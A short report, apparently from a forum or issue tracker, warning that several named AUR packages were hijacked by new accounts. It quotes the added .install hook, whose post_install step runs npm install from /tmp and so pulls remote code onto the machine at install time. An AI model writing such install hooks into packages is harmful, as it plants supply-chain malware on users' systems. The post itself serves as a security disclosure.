title: multiple malicious AUR updates
body: i just received multiple emails regarding packages i used to contribute to, with malicous updates, they all have this new .install file(or similar): +post_install() {{ + cd /tmp + npm install atomic-lockfile axios cosmiconfig uuid +}} packages: perl-alien-wxwidgets, premake-git, smenu, git-annex-standalone, panwriter, fatx, vbam-git, ipfs-desktop-bin this is active and ongoing, they've been taken over by new accounts with random names and random emails.
